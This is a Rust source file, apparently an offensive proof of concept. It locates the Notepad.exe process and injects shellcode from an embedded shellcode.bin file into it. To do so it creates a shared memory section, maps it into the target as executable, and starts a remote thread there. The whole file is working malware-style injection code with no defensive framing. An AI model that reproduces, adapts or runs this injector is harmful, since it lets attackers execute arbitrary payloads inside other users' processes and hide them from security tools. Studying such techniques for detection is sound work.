#![allow(deprecated)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(non_snake_case)]
use std::{
    intrinsics::copy_nonoverlapping,
    mem::transmute,
    os::{raw::c_void, windows::raw::HANDLE},
    ptr::null_mut,
};

#[repr(C)]
#[derive(Clone, Copy)]
pub struct SYSTEM_PROCESS_INFORMATION {
    pub NextEntryOffset: u32,
    pub NumberOfThreads: u32,
    pub Reserved1: [u8; 48],
    pub ImageName: UNICODE_STRING,
    pub BasePriority: i32,
    pub UniqueProcessId: HANDLE,
    pub Reserved2: *mut core::ffi::c_void,
    pub HandleCount: u32,
    pub SessionId: u32,
    pub Reserved3: *mut core::ffi::c_void,
    pub PeakVirtualSize: usize,
    pub VirtualSize: usize,
    pub Reserved4: u32,
    pub PeakWorkingSetSize: usize,
    pub WorkingSetSize: usize,
    pub Reserved5: *mut core::ffi::c_void,
    pub QuotaPagedPoolUsage: usize,
    pub Reserved6: *mut core::ffi::c_void,
    pub QuotaNonPagedPoolUsage: usize,
    pub PagefileUsage: usize,
    pub PeakPagefileUsage: usize,
    pub PrivatePageCount: usize,
    pub Reserved7: [i64; 6],
}

#[repr(C)]
#[derive(Clone, Copy, Default)]
pub struct SECURITY_QUALITY_OF_SERVICE {
    pub Length: u32,
    pub ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL,
    pub ContextTrackingMode: u8,
    pub EffectiveOnly: bool,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct OBJECT_ATTRIBUTES {
    pub Length: u32,
    pub RootDirectory: HANDLE,
    pub ObjectName: *const UNICODE_STRING,
    pub Attributes: OBJECT_ATTRIBUTE_FLAGS,
    pub SecurityDescriptor: *const SECURITY_DESCRIPTOR,
    pub SecurityQualityOfService: *const SECURITY_QUALITY_OF_SERVICE,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct UNICODE_STRING {
    pub Length: u16,
    pub MaximumLength: u16,
    pub Buffer: windows_sys::core::PWSTR,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct SECURITY_DESCRIPTOR {
    pub Revision: u8,
    pub Sbz1: u8,
    pub Control: SECURITY_DESCRIPTOR_CONTROL,
    pub Owner: PSID,
    pub Group: PSID,
    pub Sacl: *mut ACL,
    pub Dacl: *mut ACL,
}

#[repr(C)]
#[derive(Clone, Copy, Default)]
pub struct ACL {
    pub AclRevision: u8,
    pub Sbz1: u8,
    pub AclSize: u16,
    pub AceCount: u16,
    pub Sbz2: u16,
}

pub type SECURITY_DESCRIPTOR_CONTROL = u16;
#[repr(C)]
#[derive(Clone, Copy, Default)]
pub struct SECURITY_DESCRIPTOR_RELATIVE {
    pub Revision: u8,
    pub Sbz1: u8,
    pub Control: SECURITY_DESCRIPTOR_CONTROL,
    pub Owner: u32,
    pub Group: u32,
    pub Sacl: u32,
    pub Dacl: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct SECURITY_ATTRIBUTES {
    pub nLength: u32,
    pub lpSecurityDescriptor: *mut core::ffi::c_void,
    pub bInheritHandle: windows_sys::core::BOOL,
}

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

pub type BOOL = i32;
pub type SECTION_INHERIT = i32;
pub const ViewShare: SECTION_INHERIT = 1i32;
pub type PAGE_PROTECTION_FLAGS = u32;
pub const PAGE_EXECUTE_READ: PAGE_PROTECTION_FLAGS = 32u32;
pub const PAGE_EXECUTE_READWRITE: PAGE_PROTECTION_FLAGS = 64u32;
pub const PAGE_READWRITE: PAGE_PROTECTION_FLAGS = 4u32;
pub const SEC_COMMIT: PAGE_PROTECTION_FLAGS = 134217728u32;
pub type SECTION_FLAGS = u32;
pub const SECTION_ALL_ACCESS: SECTION_FLAGS = 983071u32;

pub type SYSTEM_INFORMATION_CLASS = i32;
pub const SystemProcessInformation: SYSTEM_INFORMATION_CLASS = 5i32;
pub type NTSTATUS = i32;

pub const STATUS_INFO_LENGTH_MISMATCH: NTSTATUS = 0xC0000004_u32 as _;

pub type WAIT_EVENT = u32;
pub type PROCESS_ACCESS_RIGHTS = u32;
pub type LPTHREAD_START_ROUTINE =
    Option<unsafe extern "system" fn(lpthreadparameter: *mut core::ffi::c_void) -> u32>;

pub const PROCESS_QUERY_INFORMATION: PROCESS_ACCESS_RIGHTS = 1024u32;
pub const PROCESS_VM_OPERATION: PROCESS_ACCESS_RIGHTS = 8u32;
pub const PROCESS_VM_READ: PROCESS_ACCESS_RIGHTS = 16u32;
pub const PROCESS_VM_WRITE: PROCESS_ACCESS_RIGHTS = 32u32;
pub type OBJECT_ATTRIBUTE_FLAGS = u32;
pub type SECURITY_IMPERSONATION_LEVEL = i32;
pub type PSID = *mut core::ffi::c_void;

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtQuerySystemInformation(
        systeminformationclass: SYSTEM_INFORMATION_CLASS,
        systeminformation: *mut core::ffi::c_void,
        systeminformationlength: u32,
        returnlength: *mut u32,
    ) -> NTSTATUS;
    fn NtCreateSection(
        sectionhandle: *mut HANDLE,
        desiredaccess: u32,
        objectattributes: *const OBJECT_ATTRIBUTES,
        maximumsize: *const i64,
        sectionpageprotection: u32,
        allocationattributes: u32,
        filehandle: HANDLE,
    ) -> NTSTATUS;
    fn NtMapViewOfSection(
        sectionhandle: HANDLE,
        processhandle: HANDLE,
        baseaddress: *mut *mut core::ffi::c_void,
        zerobits: usize,
        commitsize: usize,
        sectionoffset: *mut i64,
        viewsize: *mut usize,
        inheritdisposition: SECTION_INHERIT,
        allocationtype: u32,
        win32protect: u32,
    ) -> NTSTATUS;
    fn NtUnmapViewOfSection(
        processhandle: HANDLE,
        baseaddress: *const core::ffi::c_void,
    ) -> NTSTATUS;
}

#[link(name = "kernel32")]
unsafe extern "system" {
    fn CreateRemoteThread(
        hprocess: HANDLE,
        lpthreadattributes: *const SECURITY_ATTRIBUTES,
        dwstacksize: usize,
        lpstartaddress: LPTHREAD_START_ROUTINE,
        lpparameter: *const core::ffi::c_void,
        dwcreationflags: u32,
        lpthreadid: *mut u32,
    ) -> HANDLE;
    fn GetCurrentProcess() -> HANDLE;

    fn CloseHandle(hobject: HANDLE) -> BOOL;

    fn OpenProcess(
        dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
        binherithandle: windows_sys::core::BOOL,
        dwprocessid: u32,
    ) -> HANDLE;

    fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WAIT_EVENT;
}

fn get_pid(process_name: &str) -> u32 {
    let mut pid = 0;
    unsafe {
        let mut return_length = 0;
        let mut status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("Failed to query system information.");
            return pid;
        }

        let buff_size = return_length as usize;
        let buffer = vec![0u8; buff_size];
        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_ptr() as *mut c_void,
            buff_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("Failed to query system information.");
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && process_name.eq_ignore_ascii_case(
                    String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn main() {
    let target_process = "Notepad.exe";
    let pid = get_pid(target_process);

    if pid == 0 {
        println!("[-] Target process not found.");
        return;
    }

    println!("[+] {} process found with PID: {}", target_process, pid);

    unsafe {
        let proc_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            0,
            pid,
        );

        if proc_handle.is_null() {
            println!("[-] Failed to open target process.");
            return;
        }

        let mut section_handle = null_mut();
        let section_size = SHELLCODE.len() as i64;

        let mut status = NtCreateSection(
            &mut section_handle as *mut _,
            SECTION_ALL_ACCESS,
            null_mut(),
            &section_size as *const i64,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        );
        if status != 0 {
            println!("[-] Failed to create section.");
            CloseHandle(proc_handle);
            return;
        }

        println!("[+] Section created: {:?}", section_handle);

        let mut base_addr: *mut c_void = null_mut();
        let mut size = SHELLCODE.len() as usize;
        status = NtMapViewOfSection(
            section_handle,
            GetCurrentProcess(),
            &mut base_addr,
            0,
            0,
            null_mut(),
            &mut size,
            ViewShare,
            0,
            PAGE_READWRITE,
        );

        if status != 0 {
            println!("[-] Failed to map view of section.");
            CloseHandle(section_handle);
            CloseHandle(proc_handle);
            return;
        }

        println!("[+] Mapped view of section at address: {:?}", base_addr);

        copy_nonoverlapping(SHELLCODE.as_ptr(), base_addr as *mut u8, SHELLCODE.len());

        println!("[+] Shellcode copied to section.");

        NtUnmapViewOfSection(GetCurrentProcess(), base_addr);

        println!("[+] Unmapped view of section from current process.");

        let mut remote_buffer = null_mut();
        status = NtMapViewOfSection(
            section_handle,
            proc_handle,
            &mut remote_buffer,
            0,
            0,
            null_mut(),
            &mut size,
            ViewShare,
            0,
            PAGE_EXECUTE_READ,
        );

        if status != 0 {
            println!("[-] Failed to map view of section in target process.");
            CloseHandle(section_handle);
            CloseHandle(proc_handle);
            return;
        }

        println!(
            "[+] Mapped view of section in target process at address: {:?}",
            remote_buffer
        );

        let mut thread_id = 0;
        let thread_handle = CreateRemoteThread(
            proc_handle,
            null_mut(),
            0,
            transmute(remote_buffer),
            null_mut(),
            0,
            &mut thread_id,
        );

        if thread_handle.is_null() {
            println!("[-] Failed to create remote thread.");
            NtUnmapViewOfSection(proc_handle, remote_buffer);
            CloseHandle(section_handle);
            CloseHandle(proc_handle);
            return;
        }

        println!("[+] Thread created with ID: {}", thread_id);

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        CloseHandle(proc_handle);
    }
}
